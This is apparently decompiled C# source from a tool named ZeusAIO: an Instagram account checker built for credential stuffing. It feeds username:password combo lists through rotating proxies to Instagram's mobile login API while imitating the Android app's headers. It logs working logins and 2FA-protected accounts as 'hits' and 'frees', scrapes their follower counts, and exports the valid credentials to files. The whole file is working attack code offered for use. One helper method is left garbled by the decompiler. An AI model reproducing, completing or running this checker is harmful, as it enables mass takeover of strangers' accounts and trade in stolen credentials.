// Decompiled with JetBrains decompiler
// Type: Instagram.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using ZeusAIO;

namespace Instagram
{
  internal class Check
  {
    private static Random random = new Random();
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      while (true)
      {
        try
        {
          using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
          {
            proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            CookieStorage cookies = new CookieStorage();
            string csrf = Check.InstagramGetCSRF(ref cookies);
            httpRequest.Cookies = cookies;
            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("Cookie2", "$Version=1");
            httpRequest.AddHeader("Accept-Language", "en-US");
            httpRequest.AddHeader("X-IG-Capabilities", "3boBAA==");
            httpRequest.AddHeader("X-IG-Connection-Type", "WIFI");
            httpRequest.AddHeader("X-IG-Connection-Speed", "-1kbps");
            httpRequest.AddHeader("X-IG-App-ID", "567067343352427");
            httpRequest.AddHeader("rur", "ATN");
            string lower = (Check.GetRandomHexNumber(8) + "-" + Check.GetRandomHexNumber(4) + "-4" + Check.GetRandomHexNumber(3) + "-8" + Check.GetRandomHexNumber(3) + "-" + Check.GetRandomHexNumber(12)).ToLower();
            string str1 = "android-" + Check.GetRandomHexNumber(16);
            string str2 = HttpUtility.UrlEncode("{\"_csrftoken\":\"" + csrf + "\",\"adid\":\"" + lower + "\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"" + str1 + "\",\"google_tokens\":\"[]\",\"guid\":\"" + lower + "\",\"login_attempt_count\":0,\"password\":\"" + s[1] + "\",\"phone_id\":\"" + lower + "\",\"username\":\"" + s[0] + "\"}");
            string input = httpRequest.Post(new Uri("https://i.instagram.com/api/v1/accounts/login/"), (HttpContent) new BytesContent(Encoding.Default.GetBytes("signed_body=9387a4ccde8c044515539b8249da655d63a73093eaf7c4b45fad126aa961e45b." + str2 + "&ig_sig_key_version=4"))).ToString();
            if (input.Contains("logged_in_user"))
            {
              string str3 = Regex.Match(input, "is_verified\": (.*?),").Groups[1].Value;
              string str4 = Regex.Match(input, "is_business\": (.*?),").Groups[1].Value;
              string str5 = Regex.Match(input, "is_private\": (.*?),").Groups[1].Value;
              string username = Regex.Match(input, "\"username\": \"(.*?)\"").Groups[1].Value;
              string captures = Check.InstagramGetCaptures(cookies, username);
              if (captures == "")
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - INSTAGRAM] " + s[0] + ":" + s[1] + " | Username: " + username + " - Verified: " + str3 + " - Business: " + str4 + " - Private: " + str5, Color.Green);
                Export.AsResult("/Instagram_hits", s[0] + ":" + s[1] + " | Username: " + username + " - Verified: " + str3 + " - Business: " + str4 + " - Private: " + str5);
                return false;
              }
              ++mainmenu.hits;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[HIT - INSTAGRAM] " + s[0] + ":" + s[1] + " | Username: " + username + " - Verified: " + str3 + " - Business: " + str4 + " - Private: " + str5 + captures, Color.Green);
              Export.AsResult("/Instagram_hits", s[0] + ":" + s[1] + " | Username: " + username + " - Verified: " + str3 + " - Business: " + str4 + " - Private: " + str5 + captures);
              return false;
            }
            if (input.Contains("challenge_required") || input.Contains("\"two_factor_required\": true,"))
            {
              ++mainmenu.frees;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[FREE - INSTAGRAM] " + s[0] + ":" + s[1] + " | 2fa", Color.OrangeRed);
              Export.AsResult("/Instagram_frees", s[0] + ":" + s[1] + " | 2fa");
              return false;
            }
            if (!input.Contains("\"The password you entered is incorrect. Please try again.\"") && !input.Contains("\"The username you entered doesn't appear to belong to an account. Please check your username and try again.\",") && !input.Contains("\"Invalid Parameters\","))
              break;
            break;
          }
        }
        catch (Exception ex)
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    private static string InstagramGetCSRF(ref CookieStorage cookies)
    {
      while (true)
      {
        try
        {
          using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
          {
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            cookies = new CookieStorage();
            httpRequest.Cookies = cookies;
            httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
            httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
            return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    private static string InstagramGetCaptures(CookieStorage cookies, string username)
    {
      while (true)
      {
        try
        {
          using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
          {
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            httpRequest.Cookies = cookies;
            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "*/*");
            string input = httpRequest.Get(new Uri("https://www.instagram.com/" + username + "/")).ToString();
            return input.Contains("\"edge_followed_by\":{\"count\":") ? " - Followers: " + Regex.Match(input, "\"edge_followed_by\":{\"count\":(.*?)}").Groups[1].Value + " - Following: " + Regex.Match(input, ",\"edge_follow\":{\"count\":(.*?)}").Groups[1].Value : "";
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    public static string GetRandomHexNumber(int digits)
    {
      byte[] buffer = new byte[digits / 2];
      Check.random.NextBytes(buffer);
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: method pointer
      string str = string.Concat(((IEnumerable<string>) Enumerable.Select<byte, string>((IEnumerable<M0>) buffer, (Func<M0, M1>) (Check.\u003C\u003Ec.\u003C\u003E9__4_0 ?? (Check.\u003C\u003Ec.\u003C\u003E9__4_0 = new Func<byte, string>((object) Check.\u003C\u003Ec.\u003C\u003E9, __methodptr(\u003CGetRandomHexNumber\u003Eb__4_0)))))).ToArray<string>());
      return digits % 2 == 0 ? str : str + Check.random.Next(16).ToString("X");
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
